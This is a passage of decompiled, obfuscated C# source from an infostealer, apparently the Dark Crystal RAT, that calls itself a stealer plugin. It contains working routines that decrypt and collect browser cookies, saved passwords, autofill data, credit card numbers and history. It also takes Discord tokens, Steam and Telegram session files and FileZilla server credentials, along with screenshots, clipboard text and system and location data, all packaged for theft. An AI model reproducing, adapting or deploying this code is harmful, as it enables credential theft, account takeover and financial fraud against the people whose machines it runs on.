              this.\u0036b2("[" + str1 + "] Invalid DB: " + str2);
              continue;
            }
            se8.\u0031NO = new List<string>();
            string str3 = this.B91(str2);
            string str4 = xY7.B84() + "\\" + xY7.\u003842(10);
            File.Copy(str2, str4, true);
            this.\u0036b2("[" + str1 + "] Temp DB: " + str4);
            this.\u00345E(str2);
            try
            {
              mR9.\u0032xR obj2 = new mR9.\u0032xR();
              obj2.\u003941 = se8;
              obj2.\u003411 = new \u003174(str4);
              obj2.\u003411.\u00388t("moz_places");
              int toExclusive = obj2.\u003411.\u0036zn();
              this.\u0036b2("[" + str1 + "] DB Rows: " + toExclusive.ToString());
              obj2.f8f = new object();
              Parallel.For(0, toExclusive, new Action<int>(obj2.LjM));
              if (obj2.\u003941.\u0031NO.Count > 0)
              {
                if (_param1)
                  _param5.AddRange((IEnumerable<string>) obj2.\u003941.\u0031NO);
                else
                  this.aM8((str3 == "Unknown" ? "Browsers/Unknowns/" : "Browsers/") + str1 + "[" + str3 + "]#" + xY7.\u003842(4) + ".txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) obj2.\u003941.\u0031NO)));
                ++_param4;
                _param3 += obj2.\u003941.\u0031NO.Count;
              }
            }
            catch (Exception ex)
            {
              this.\u0036b2("[" + str1 + "] Error: " + ex.Message);
            }
            File.Delete(str4);
          }
          catch
          {
          }
          this.\u0036b2("[" + str1 + "] Processed: " + str2);
          Thread.Sleep(10);
        }
      }
      catch
      {
      }
    }

    private void B47(out int _param1)
    {
      List<string> stringList = new List<string>();
      string s = string.Empty;
      _param1 = 0;
      try
      {
        string path = u8L.Gpv();
        if (!Directory.Exists(path))
        {
          s = "Discord not installed!";
        }
        else
        {
          foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
          {
            string str = File.ReadAllText(file);
            if (str.Contains("oken"))
              stringList.Add(str);
          }
          if (stringList.Count == 0)
          {
            s = "Failed.";
          }
          else
          {
            foreach (string input in stringList)
            {
              foreach (Match match in Regex.Matches(input, "[^\"]*"))
              {
                int num;
                if (match.Length == 59 && match.ToString().Contains<char>('.') && !match.ToString().Contains<char>('[') && !match.ToString().Contains<char>(')'))
                  num = ((IEnumerable<string>) match.ToString().Split(new string[1]
                  {
                    "."
                  }, StringSplitOptions.None)).Count<string>() - 1 >= 2 ? 1 : 0;
                else
                  num = 0;
                if (num != 0)
                {
                  s = s + match.ToString() + "\r\n";
                  ++_param1;
                }
              }
            }
          }
        }
      }
      catch
      {
      }
      this.aM8("Other/Discord Token(s).txt", Encoding.UTF8.GetBytes(s));
    }

    private void \u0031T3(out string _param1)
    {
      _param1 = "Steam not installed.";
      try
      {
        string path = u8L.W33();
        if (Directory.Exists(path + "/config"))
        {
          ((IEnumerable<string>) Directory.GetFiles(path + "/config", "*.vdf")).ToList<string>().ForEach(new Action<string>(this.\u003761));
          ((IEnumerable<string>) Directory.GetFiles(path, "ssfn*")).ToList<string>().ForEach(new Action<string>(this.\u003546));
          string str1 = string.Empty;
          if (Directory.Exists(path + "/steamapps/common"))
          {
            foreach (string directory in Directory.GetDirectories(path + "/steamapps/common"))
              str1 = str1 + "-" + Path.GetFileName(directory) + "\r\n";
          }
          string str2 = string.Empty;
          foreach (string[] strArray in u8L.\u0032hf())
            str2 = str2 + "\r\n-Login: " + strArray[1] + "\r\n-Profile URL: " + strArray[2] + "\r\n-ID: " + strArray[0] + "\r\n";
          _param1 = "https://steamcommunity.com/profiles/" + u8L.\u003777();
          this.aM8("Other/Steam#Information.txt", Encoding.UTF8.GetBytes("Login: " + u8L.\u003756() + "\r\nID: " + u8L.\u003777() + "\r\nProfile URL: https://steamcommunity.com/profiles/" + u8L.\u003777() + "\r\nPath: " + path + "\r\nLang: " + u8L.Tf7() + "\r\n\r\nAll accounts: " + str2 + "\r\nSteam Apps: \r\n" + str1));
        }
        else
          this.aM8("Other/Steam#Information.txt", Encoding.UTF8.GetBytes("Steam not installed."));
      }
      catch
      {
      }
    }

    private void \u00374m()
    {
      try
      {
        string str = u8L.e47();
        if (Directory.Exists(str + "/tdata"))
        {
          this.x22.\u003182("Other/Telegram/tdata/");
          ((IEnumerable<string>) Directory.GetFiles(str + "/tdata", "*", SearchOption.TopDirectoryOnly)).Where<string>(mR9.PU3.\u003C\u003E9__26_0 ?? (mR9.PU3.\u003C\u003E9__26_0 = new Func<string, bool>(mR9.PU3.\u003C\u003E9.\u0033fi))).ToList<string>().ForEach(new Action<string>(this.\u0036z6));
          ((IEnumerable<string>) Directory.GetFiles(str + "/tdata", "*", SearchOption.TopDirectoryOnly)).Where<string>(mR9.PU3.\u003C\u003E9__26_2 ?? (mR9.PU3.\u003C\u003E9__26_2 = new Func<string, bool>(mR9.PU3.\u003C\u003E9.\u003458))).ToList<string>().ForEach(new Action<string>(this.biU));
          foreach (string directory in Directory.GetDirectories(str + "/tdata", "*"))
          {
            mR9.Pcs pcs = new mR9.Pcs();
            pcs.\u0032y2 = this;
            pcs.\u0035ek = directory;
            if (new DirectoryInfo(pcs.\u0035ek).Name.Length == 16)
            {
              this.x22.\u003182("Other/Telegram/tdata/" + Path.GetFileName(pcs.\u0035ek) + "/");
              ((IEnumerable<string>) Directory.GetFiles(pcs.\u0035ek, "*")).ToList<string>().ForEach(new Action<string>(pcs.\u0035U8));
            }
          }
          this.aM8("Other/Telegram#Information.txt", Encoding.UTF8.GetBytes("Path: " + str));
        }
        else
          this.aM8("Other/Telegram#Information.txt", Encoding.UTF8.GetBytes("Telegram not installed."));
      }
      catch
      {
      }
    }

    private void \u003761([In] string obj0) => this.aM8("Other/Steam/config/" + Path.GetFileName(obj0), File.ReadAllBytes(obj0));

    private void \u003546([In] string obj0) => this.aM8("Other/Steam/" + Path.GetFileName(obj0), File.ReadAllBytes(obj0));

    private void \u0036z6([In] string obj0) => this.aM8("Other/Telegram/tdata/" + Path.GetFileName(obj0), File.ReadAllBytes(obj0));

    private void biU([In] string obj0) => this.aM8("Other/Telegram/tdata/" + Path.GetFileName(obj0), File.ReadAllBytes(obj0));

    private sealed class f5o
    {
      public bool \u003733;
      public bool U6M;
      public bool Fq7;
      public bool G26;
      public bool y25;
      public mR9 fT8;
      public string \u003866;
      public string \u0034TV;
      public string \u0031Oz;
      public string Q51;
      public string U2M;
      public bool PO2;
      public Dictionary<string, object> \u00392D;
      public bool x6B;
      public bool zL7;
      public bool q77;
      public bool \u0033P1;
      public bool u2C;
      public bool \u003917;
      public bool \u0038eX;
      public bool \u00384v;
      public string bR5;
      public Stopwatch RYN;
      public int \u00352a;
      public Action<object[]> \u003416;
      public Action<object[]> \u0032pz;
      public Action<object[]> UcV;
      public ThreadStart sw5;
      public Action<object[]> l98;

      internal void EE2()
      {
        if (!(this.\u003733 | this.U6M | this.Fq7 | this.G26 | this.y25))
          return;
        lock (this.fT8.x22)
          this.fT8.x22.\u003182("Browsers/");
        try
        {
          string str1 = this.\u003866;
          char[] chArray = new char[1]{ ';' };
          foreach (string str2 in str1.Split(chArray))
          {
            string str3 = xY7.\u0032L7(str2);
            this.fT8.\u0036b2("[Browsers] Scanning directory (" + str3 + ")");
            this.fT8.o1v("Scanning directory (" + str3 + ") ...", this.\u0034TV, this.\u0031Oz, this.Q51, this.U2M);
            try
            {
              this.fT8.\u00331r.AddRange((IEnumerable<string>) this.fT8.\u00339t(str3));
            }
            catch
            {
            }
            Thread.Sleep(200);
          }
          this.fT8.\u00331r.RemoveAll(mR9.PU3.\u003C\u003E9__4_4 ?? (mR9.PU3.\u003C\u003E9__4_4 = new Predicate<string>(mR9.PU3.\u003C\u003E9.q45)));
          this.fT8.\u00331r = this.fT8.\u00331r.Distinct<string>().ToList<string>();
          this.fT8.\u0036b2("[Browsers] Scanned elements: " + this.fT8.\u00331r.Count.ToString());
          if (this.fT8.\u00331r.Count > 0)
          {
            if (this.\u003733)
            {
              this.fT8.\u0036b2("[Browsers] Grabbing cookies");
              this.fT8.o1v("Grabbing cookies...", this.\u0034TV, this.\u0031Oz, this.Q51, this.U2M);
              int num1;
              int num2;
              List<string> first;
              this.fT8.\u003214(this.PO2, out num1, out num2, out first);
              int num3;
              int num4;
              List<string> second;
              this.fT8.\u003335(this.PO2, out num3, out num4, out second);
              lock (this.\u00392D)
              {
                this.\u00392D.Add("CookiesCount", (object) (num1 + num3));
                this.\u00392D.Add("CookiesDBCount", (object) (num2 + num4));
              }
              if (this.PO2)
                this.fT8.aM8("Browsers/Cookies[All].txt", Encoding.UTF8.GetBytes(string.Join("\r\n", first.Concat<string>((IEnumerable<string>) second))));
            }
            if (this.U6M)
            {
              this.fT8.\u0036b2("[Browsers] Grabbing passwords");
              this.fT8.o1v("Grabbing passwords...", this.\u0034TV, this.\u0031Oz, this.Q51, this.U2M);
              int num5;
              int num6;
              List<string> first;
              this.fT8.\u003512(this.PO2, this.x6B, out num5, out num6, out first);
              int num7;
              int num8;
              List<string> second;
              this.fT8.\u0032SL(this.PO2, this.x6B, out num7, out num8, out second);
              lock (this.\u00392D)
              {
                this.\u00392D.Add("PasswordsCount", (object) (num5 + num7));
                this.\u00392D.Add("PasswordsDBCount", (object) (num6 + num8));
              }
              if (this.PO2)
                this.fT8.aM8("Browsers/Passwords[All].txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", first.Concat<string>((IEnumerable<string>) second))));
            }
            if (this.Fq7)
            {
              this.fT8.\u0036b2("[Browsers] Grabbing forms");
              this.fT8.o1v("Grabbing forms...", this.\u0034TV, this.\u0031Oz, this.Q51, this.U2M);
              int num9;
              int num10;
              List<string> first;
              this.fT8.lnH(this.PO2, this.x6B, out num9, out num10, out first);
              int num11;
              int num12;
              List<string> second;
              this.fT8.kZ9(this.PO2, this.x6B, out num11, out num12, out second);
              lock (this.\u00392D)
              {
                this.\u00392D.Add("FormsCount", (object) (num9 + num11));
                this.\u00392D.Add("FormsDBCount", (object) (num10 + num12));
              }
              if (this.PO2)
                this.fT8.aM8("Browsers/Forms[All].txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", first.Concat<string>((IEnumerable<string>) second))));
            }
            if (this.G26)
            {
              this.fT8.\u0036b2("[Browsers] Grabbing CC");
              this.fT8.o1v("Grabbing CC...", this.\u0034TV, this.\u0031Oz, this.Q51, this.U2M);
              int num13;
              int num14;
              List<string> values;
              this.fT8.I87(this.PO2, this.x6B, out num13, out num14, out values);
              lock (this.\u00392D)
              {
                this.\u00392D.Add("CCCount", (object) num13);
                this.\u00392D.Add("CCDBCount", (object) num14);
              }
              if (this.PO2)
                this.fT8.aM8("Browsers/CC[All].txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", (IEnumerable<string>) values)));
            }
            if (this.y25)
            {
              this.fT8.\u0036b2("[Browsers] Grabbing history");
              this.fT8.o1v("Grabbing history...", this.\u0034TV, this.\u0031Oz, this.Q51, this.U2M);
              int num15;
              int num16;
              List<string> first;
              this.fT8.\u0031ds(this.PO2, this.x6B, out num15, out num16, out first);
              int num17;
              int num18;
              List<string> second;
              this.fT8.\u003591(this.PO2, this.x6B, out num17, out num18, out second);
              lock (this.\u00392D)
              {
                this.\u00392D.Add("HistoryCount", (object) (num15 + num17));
                this.\u00392D.Add("HistoryDBCount", (object) (num16 + num18));
              }
              if (this.PO2)
                this.fT8.aM8("Browsers/History[All].txt", Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", first.Concat<string>((IEnumerable<string>) second))));
            }
          }
        }
        catch
        {
        }
      }

      internal void \u003782()
      {
        try
        {
          Zk3.itH.ForEach(this.\u0032pz ?? (this.\u0032pz = new Action<object[]>(this.\u0038N7)));
        }
        catch
        {
        }
        try
        {
          Zk3.\u003978.ForEach(this.UcV ?? (this.UcV = new Action<object[]>(this.h62)));
        }
        catch
        {
        }
      }

      internal void \u0038N7([In] object[] obj0)
      {
        try
        {
          this.fT8.\u0036b2("[StealerPlugin] Invoke: " + obj0[1].GetType().GetHashCode().ToString());
          ((List<object[]>) ((MethodBase) obj0[0]).Invoke(obj0[1], (object[]) null)).ForEach(this.\u003416 ?? (this.\u003416 = new Action<object[]>(this.L53)));
        }
        catch
        {
        }
      }

      internal void L53([In] object[] obj0) => this.fT8.aM8((string) obj0[0], (byte[]) obj0[1]);

      internal void h62([In] object[] obj0)
      {
        try
        {
          foreach (KeyValuePair<string, object> keyValuePair in (Dictionary<string, object>) ((MethodBase) obj0[0]).Invoke(obj0[1], (object[]) null))
          {
            lock (this.\u00392D)
            {
              if (!this.\u00392D.ContainsKey(keyValuePair.Key))
                this.\u00392D.Add(keyValuePair.Key, keyValuePair.Value);
            }
          }
        }
        catch
        {
        }
      }

      internal void \u0033h3()
      {
        if (this.zL7)
        {
          this.fT8.\u0036b2("[Other] Grabbing steam");
          lock (this.fT8.x22)
            this.fT8.x22.\u003182("Other/Steam/");
          string str;
          this.fT8.\u0031T3(out str);
          lock (this.\u00392D)
            this.\u00392D.Add("SteamProfileURL", (object) str);
        }
        if (this.q77)
        {
          this.fT8.\u0036b2("[Other] Grabbing telegram");
          lock (this.fT8.x22)
            this.fT8.x22.\u003182("Other/Telegram/");
          this.fT8.\u00374m();
        }
        if (this.\u0033P1)
        {
          this.fT8.\u0036b2("[Other] Grabbing discord tokens");
          int num;
          this.fT8.B47(out num);
          lock (this.\u00392D)
            this.\u00392D.Add("DiscordTokensCount", (object) num);
        }
        try
        {
          if (this.u2C)
          {
            this.fT8.\u0036b2("[Other] Grabbing filezilla");
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\sitemanager.xml"))
              this.fT8.aM8("Other/FileZilla#sitemanager.xml", File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\sitemanager.xml"));
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\recentservers.xml"))
              this.fT8.aM8("Other/FileZilla#recentservers.xml", File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\FileZilla\\recentservers.xml"));
          }
        }
        catch
        {
        }
        try
        {
          if (this.\u003917)
          {
            this.fT8.\u0036b2("[Other] Screenshots:");
            foreach (Screen allScreen in Screen.AllScreens)
            {
              Yo1 yo1 = new Yo1();
              yo1.\u0038LZ(allScreen.DeviceName);
              this.fT8.aM8("Screenshots/Screenshot#" + allScreen.DeviceName.Replace("\\\\.\\", "") + ".jpg", yo1.X1I(true));
              yo1.\u0023Nn();
              this.fT8.\u0036b2("-" + allScreen.DeviceName);
            }
          }
        }
        catch
        {
        }
        try
        {
          if (this.\u0038eX)
          {
            this.fT8.\u0036b2("[Other] Clipboard");
            Thread thread = new Thread(this.sw5 ?? (this.sw5 = new ThreadStart(this.S73)));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
          }
        }
        catch
        {
        }
        try
        {
          if (!this.\u00384v)
            return;
          this.fT8.\u0036b2("[Other] Saving system information");
          string str = "";
          try
          {
            foreach (Screen allScreen in Screen.AllScreens)
            {
              try
              {
                string[] strArray = new string[7]
                {
                  str,
                  "\r\n",
                  allScreen.DeviceName,
                  " @ ",
                  null,
                  null,
                  null
                };
                int num = allScreen.Bounds.Width;
                strArray[4] = num.ToString();
                strArray[5] = "x";
                num = allScreen.Bounds.Height;
                strArray[6] = num.ToString();
                str = string.Concat(strArray);
              }
              catch
              {
              }
            }
          }
          catch
          {
          }
          string s = "  ___           _      ___             _        _   ___    _ _____ \r\n |   \\ __ _ _ _| |__  / __|_ _ _  _ __| |_ __ _| | | _ \\  /_\\_   _|\r\n | |) / _` | '_| / / | (__| '_| || (_-<  _/ _` | | |   / / _ \\| |  \r\n |___/\\__,_|_| |_\\_\\  \\___|_|  \\_, /__/\\__\\__,_|_| |_|_\\/_/ \\_\\_|  \r\n                               |__/                                \r\n———————————————————————————————————————\r\nPC Name: " + \u0036D4.WGC() + "\r\nUser Name: " + \u0036D4.k4d() + "\r\nWindows: " + L25.\u0037Rh() + "\r\nGPU Name: " + \u0036D4.JTu() + "\r\nCPU Name: " + \u0036D4.IJ3() + "\r\nBIOS: " + \u0036D4.H98() + "\r\nLANIP: " + \u0036D4.IP8() + "\r\nAntivirus: " + \u0036D4.\u0039C1() + "\r\nFirewall: " + \u0036D4.b7f() + "\r\nMotherboard: " + \u0036D4.Emi() + "\r\nRAM: " + \u0036D4.\u0032tO() + "\r\nFramework Version: " + \u0036D4.t7B() + "\r\nPath: " + Path.GetDirectoryName(Ej4.\u0034Jt) + "\r\n\r\nIP: " + g79.xVJ["ip"]?.ToString() + "\r\nCity: " + g79.xVJ["city"]?.ToString() + "\r\nCountry code: " + g79.xVJ["country"]?.ToString() + "\r\nLocation: " + g79.xVJ["loc"]?.ToString() + "\r\n\r\nScreens: " + str + "\r\n\r\nSave time: " + DateTime.Now.ToString("dd.MM.yyyy HH:mm");
          this.fT8.aM8("Information [" + g79.xVJ["country"]?.ToString() + ", " + g79.xVJ["city"]?.ToString() + "].txt", Encoding.UTF8.GetBytes(s));
        }
        catch
        {
        }
      }

      internal void S73()
      {
        if (!Clipboard.ContainsText())
          return;
        this.fT8.aM8("Clipboard.txt", Encoding.UTF8.GetBytes(Clipboard.GetText(TextDataFormat.UnicodeText)));
      }

      internal void \u0032J2()
      {
        try
        {
          Zk3.R4v.ForEach(this.l98 ?? (this.l98 = new Action<object[]>(this.sOy)));
        }
        catch
        {
        }
        this.bR5 = (string) null;
        this.\u00352a = 0;
      }

      internal void sOy([In] object[] obj0)
      {
        try
        {
          ((MethodBase) obj0[0]).Invoke(obj0[1], new object[4]
          {
            (object) this.bR5,
            (object) this.RYN.Elapsed,
            (object) this.\u00352a,
            (object) this.\u00392D
          });
        }
        catch
        {
        }
      }
    }

    [Serializable]
    private sealed class PU3
    {
      public static readonly mR9.PU3 \u003C\u003E9 = new mR9.PU3();
      public static Predicate<string> \u003C\u003E9__4_4;
      public static Predicate<string> \u003C\u003E9__15_0;
      public static Predicate<string> \u003C\u003E9__16_0;
      public static Predicate<string> \u003C\u003E9__17_0;
      public static Predicate<string> \u003C\u003E9__18_0;
      public static Predicate<string> \u003C\u003E9__19_0;
      public static Predicate<string> \u003C\u003E9__20_0;
      public static Predicate<string> \u003C\u003E9__21_0;
      public static Predicate<string> \u003C\u003E9__22_0;
      public static Predicate<string> \u003C\u003E9__23_0;
      public static Func<string, bool> \u003C\u003E9__26_0;
      public static Func<string, bool> \u003C\u003E9__26_2;

      internal bool q45([In] string obj0) => obj0 == null;

      internal bool \u0039LX([In] string obj0) => Path.GetFileName(obj0).Contains("Cookies") && Path.GetExtension(obj0) != ".txt";

      internal bool b1Y([In] string obj0) => Path.GetFileName(obj0).Contains("cookies.sqlite");

      internal bool \u0039Yc([In] string obj0) => Path.GetFileName(obj0).Contains("Login Data") || Path.GetFileName(obj0).Contains("Passman Data");

      internal bool \u003464([In] string obj0) => Path.GetFileName(obj0).Contains("logins.json");

      internal bool IT2([In] string obj0) => Path.GetFileName(obj0).Contains("Web Data") || Path.GetFileName(obj0).Contains("Autofill Data");

      internal bool \u003888([In] string obj0) => Path.GetFileName(obj0).Contains("formhistory.sqlite");

      internal bool w5T([In] string obj0) => Path.GetFileName(obj0).Contains("Web Data") || Path.GetFileName(obj0).Contains("Credit Cards");

      internal bool v7L([In] string obj0) => Path.GetFileName(obj0).Contains("History") && Path.GetExtension(obj0) != ".txt";

      internal bool r2T([In] string obj0) => Path.GetFileName(obj0).Contains("places.sqlite");

      internal bool \u0033fi([In] string obj0) => new FileInfo(obj0).Length < 5120L && new FileInfo(obj0).Name.EndsWith("s") && new FileInfo(obj0).Name.Length == 17;

      internal bool \u003458([In] string obj0) => new FileInfo(obj0).Name.StartsWith("usertag") || new FileInfo(obj0).Name.StartsWith("settings") || new FileInfo(obj0).Name.StartsWith("key_data");
    }

    private sealed class yyq
    {
      public mR9 \u0035c7;
      public object \u0037dA;
      public List<string> \u0033v3;

      internal void JeW([In] string obj0)
      {
        try
        {
          List<string> collection = this.\u0035c7.\u00339t(obj0);
          lock (this.\u0037dA)
            this.\u0033v3.AddRange((IEnumerable<string>) collection);
        }
        catch
        {
        }
      }
    }

    private sealed class \u003792
    {
      public Dictionary<string, object> \u0034dQ;
      public List<string> YxG;
      public mR9 J86;
    }

    private sealed class \u00372Y
    {
      public \u003174 fo1;
      public object AJl;
      public mR9.\u003792 d5B;

      internal void \u003221([In] int obj0)
      {
        try
        {
          string str1 = string.Empty;
          string s = this.fo1.vg9(obj0, "encrypted_value");
          if (s.Length < 1)
            return;
          try
          {
            if (Encoding.Default.GetBytes(s)[0] == (byte) 118)
            {
              if (this.d5B.\u0034dQ != null)
                str1 = this.d5B.J86.O73(s, this.d5B.\u0034dQ);
            }
            else
              str1 = this.d5B.J86.\u0038s2(s);
          }
          catch
          {
          }
          if (string.IsNullOrWhiteSpace(str1))
            return;
          string str2 = this.fo1.vg9(obj0, "is_httponly").Contains("1") ? "TRUE" : "FALSE";
          string str3 = this.fo1.vg9(obj0, "is_secure").Contains("1") ? "TRUE" : "FALSE";
          string str4 = this.fo1.vg9(obj0, "host_key");
          string str5 = this.fo1.vg9(obj0, "path");
          string str6 = this.fo1.vg9(obj0, "expires_utc");
          string str7 = this.fo1.vg9(obj0, "name");
          lock (this.AJl)
            this.d5B.YxG.Add(str4 + "\t" + str2 + "\t" + str5 + "\t" + str3 + "\t" + str6 + "\t" + str7 + "\t" + str1);
        }
        catch
        {
        }
      }
    }

    private sealed class \u0033lC
    {
      public List<string> \u0038ey;
    }

    private sealed class O57
    {
      public \u003174 y3x;
      public object T47;
      public mR9.\u0033lC h4K;

      internal void \u0036bc([In] int obj0)
      {
        try
        {
          string str1 = this.y3x.vg9(obj0, "value");
          if (string.IsNullOrWhiteSpace(str1))
            return;
          string str2 = this.y3x.vg9(obj0, "isHttpOnly").Contains("1") ? "TRUE" : "FALSE";
          string str3 = this.y3x.vg9(obj0, "isSecure").Contains("1") ? "TRUE" : "FALSE";
          string str4 = this.y3x.vg9(obj0, "host");
          string str5 = this.y3x.vg9(obj0, "path");
          string str6 = this.y3x.vg9(obj0, "expiry");
          string str7 = this.y3x.vg9(obj0, "name");
          lock (this.T47)
            this.h4K.\u0038ey.Add(str4 + "\t" + str2 + "\t" + str5 + "\t" + str3 + "\t" + str6 + "\t" + str7 + "\t" + str1);
        }
        catch
        {
        }
      }
    }

    private sealed class \u0033v5
    {
      public mR9 hN6;
      public bool \u0033LJ;
    }

    private sealed class O3B
    {
      public Dictionary<string, object> \u003283;
      public List<string> f55;
      public mR9.\u0033v5 y99;
    }

    private sealed class RCI
    {
      public \u003174 x2P;
      public object y91;
      public mR9.O3B \u003479;

      internal void M2A([In] int obj0)
      {
        try
        {
          string str1 = string.Empty;
          string s = this.x2P.vg9(obj0, "password_value");
          try
          {
            if (Encoding.Default.GetBytes(s)[0] == (byte) 118)
            {
              if (this.\u003479.\u003283 != null)
                str1 = this.\u003479.y99.hN6.O73(s, this.\u003479.\u003283);
            }
            else
              str1 = this.\u003479.y99.hN6.\u0038s2(s);
          }
          catch
          {
          }
          string str2 = this.x2P.vg9(obj0, "origin_url");
          string str3 = this.x2P.vg9(obj0, "username_value");
          if (this.\u003479.y99.\u0033LJ && (string.IsNullOrWhiteSpace(str1) || string.IsNullOrWhiteSpace(str3)))
            return;
          lock (this.y91)
            this.\u003479.f55.Add("URL: " + str2 + "\r\nLogin: " + str3 + "\r\nPassword: " + str1);
        }
        catch
        {
        }
      }
    }

    private sealed class KtU
    {
      public bool \u0035O9;
    }

    private sealed class X2T
    {
      public List<string> X58;
      public mR9.KtU \u003233;
    }

    private sealed class \u0036g7
    {
      public object V16;
      public mR9.X2T \u003842;

      internal void goC([In] object obj0)
      {
        try
        {
          Dictionary<string, object> dictionary = (Dictionary<string, object>) obj0;
          string str1 = dictionary["hostname"].ToString();
          string str2 = dictionary["encryptedUsername"].ToString();
          string str3 = dictionary["encryptedPassword"].ToString();
          string str4 = W61.sra(str2);
          string str5 = W61.sra(str3);
          if (this.\u003842.\u003233.\u0035O9 && (string.IsNullOrWhiteSpace(str5) || string.IsNullOrWhiteSpace(str4)))
            return;
          lock (this.V16)
            this.\u003842.X58.Add("URL: " + str1 + "\r\nLogin: " + str4 + "\r\nPassword: " + str5);
        }
        catch
        {
        }
      }
    }

    private sealed class \u0035kF
    {
      public bool \u00364g;
    }

    private sealed class mA8
    {
      public List<string> H7y;
      public mR9.\u0035kF Zk3;
    }

    private sealed class \u0038GA
    {
      public \u003174 nub;
      public object Qi6;
      public mR9.mA8 GCp;

      internal void Es2([In] int obj0)
      {
        try
        {
          string str1 = this.nub.vg9(obj0, "name");
          string str2 = this.nub.vg9(obj0, "value");
          if (this.GCp.Zk3.\u00364g && (string.IsNullOrWhiteSpace(str1) || string.IsNullOrWhiteSpace(str2)))
            return;
          lock (this.Qi6)
            this.GCp.H7y.Add("Name: " + str1 + "\r\nValue: " + str2);
        }
        catch
        {
        }
      }
    }

    private sealed class p75
    {
      public bool Wk5;
    }

    private sealed class mx6
    {
      public List<string> \u0037Sq;
      public mR9.p75 GIf;
    }

    private sealed class e27
    {
      public \u003174 \u0031BG;
      public object \u003931;
      public mR9.mx6 \u0034QE;

      internal void N7h([In] int obj0)
      {
        try
        {
          string str1 = this.\u0031BG.vg9(obj0, "fieldname");
          string str2 = this.\u0031BG.vg9(obj0, "value");
          if (this.\u0034QE.GIf.Wk5 && (string.IsNullOrWhiteSpace(str1) || string.IsNullOrWhiteSpace(str2)))
            return;
          lock (this.\u003931)
            this.\u0034QE.\u0037Sq.Add("Name: " + str1 + "\r\nValue: " + str2);
        }
        catch
        {
        }
      }
    }

    private sealed class \u003844
    {
      public mR9 LtT;
      public bool \u00339T;
    }

    private sealed class kmX
    {
      public Dictionary<string, object> \u00337A;
      public List<string> \u003629;
      public mR9.\u003844 \u0036Eo;
    }

    private sealed class hR8
    {
      public \u003174 \u0033QQ;
      public object \u00355L;
      public mR9.kmX kx4;

      internal void dF3([In] int obj0)
      {
        try
        {
          string empty1 = string.Empty;
          string s1 = this.\u0033QQ.vg9(obj0, "card_number_encrypted");
          string str1;
          try
          {
            str1 = s1.Length <= 0 || Encoding.Default.GetBytes(s1)[0] != (byte) 118 ? this.kx4.\u0036Eo.LtT.\u0038s2(s1) : this.kx4.\u0036Eo.LtT.O73(s1, this.kx4.\u00337A);
          }
          catch
          {
            str1 = s1;
          }
          string empty2 = string.Empty;
          string s2 = this.\u0033QQ.vg9(obj0, "name_on_card");
          string str2;
          try
          {
            str2 = s2.Length <= 0 || Encoding.Default.GetBytes(s2)[0] != (byte) 118 ? this.kx4.\u0036Eo.LtT.\u0038s2(s2) : this.kx4.\u0036Eo.LtT.O73(s2, this.kx4.\u00337A);
          }
          catch
          {
            str2 = s2;
          }
          string empty3 = string.Empty;
          string s3 = this.\u0033QQ.vg9(obj0, "billing_address_id");
          string str3;
          try
          {
            str3 = s3.Length <= 0 || Encoding.Default.GetBytes(s3)[0] != (byte) 118 ? this.kx4.\u0036Eo.LtT.\u0038s2(s3) : this.kx4.\u0036Eo.LtT.O73(s3, this.kx4.\u00337A);
          }
          catch
          {
            str3 = s3;
          }
          string empty4 = string.Empty;
          string s4 = this.\u0033QQ.vg9(obj0, "expiration_month");
          string str4;
          try
          {
            str4 = s4.Length <= 0 || Encoding.Default.GetBytes(s4)[0] != (byte) 118 ? this.kx4.\u0036Eo.LtT.\u0038s2(s4) : this.kx4.\u0036Eo.LtT.O73(s4, this.kx4.\u00337A);
          }
          catch
          {
            str4 = s4;
          }
          string empty5 = string.Empty;
          string s5 = this.\u0033QQ.vg9(obj0, "expiration_year");
          string str5;
          try
          {
            str5 = s5.Length <= 0 || Encoding.Default.GetBytes(s5)[0] != (byte) 118 ? this.kx4.\u0036Eo.LtT.\u0038s2(s5) : this.kx4.\u0036Eo.LtT.O73(s5, this.kx4.\u00337A);
          }
          catch
          {
            str5 = s5;
          }
          if (this.kx4.\u0036Eo.\u00339T && (string.IsNullOrWhiteSpace(str1) || string.IsNullOrWhiteSpace(str2) || string.IsNullOrWhiteSpace(str4) || string.IsNullOrWhiteSpace(str5)))
            return;
          lock (this.\u00355L)
            this.kx4.\u003629.Add("Name: " + str2 + "\r\nNumber: " + str1 + "\r\nExpiration: " + str4 + "/" + str5 + "\r\nBilling: " + str3);
        }
        catch
        {
        }
      }
    }

    private sealed class Y8o
    {
      public bool \u003629;
    }

    private sealed class \u0034Us
    {
      public List<string> \u0032dR;
      public mR9.Y8o JkW;
    }

    private sealed class f3y
    {
      public \u003174 L38;
      public object m1l;
      public mR9.\u0034Us \u0039a9;

      internal void \u0034p4([In] int obj0)
      {
        try
        {
          string str1 = this.L38.vg9(obj0, "title");
          string str2 = this.L38.vg9(obj0, "url");
          if (this.\u0039a9.JkW.\u003629 && string.IsNullOrWhiteSpace(str2))
            return;
          lock (this.m1l)
            this.\u0039a9.\u0032dR.Add("Title: " + str1 + "\r\nURL: " + str2);
        }
        catch
        {
        }
      }
    }

    private sealed class \u00374h
    {
      public bool \u0033d3;
    }

    private sealed class Se8
    {
      public List<string> \u0031NO;
      public mR9.\u00374h F81;
    }

    private sealed class \u0032xR
    {
      public \u003174 \u003411;
      public object f8f;
      public mR9.Se8 \u003941;

      internal void LjM([In] int obj0)
      {
        try
        {
          string str1 = this.\u003411.vg9(obj0, "title");
          string str2 = this.\u003411.vg9(obj0, "url");
          if (this.\u003941.F81.\u0033d3 && string.IsNullOrWhiteSpace(str2))
            return;
          lock (this.f8f)
            this.\u003941.\u0031NO.Add("Title: " + str1 + "\r\nURL: " + str2);
        }
        catch
        {
        }
      }
    }

    private sealed class Pcs
    {
      public string \u0035ek;
      public mR9 \u0032y2;

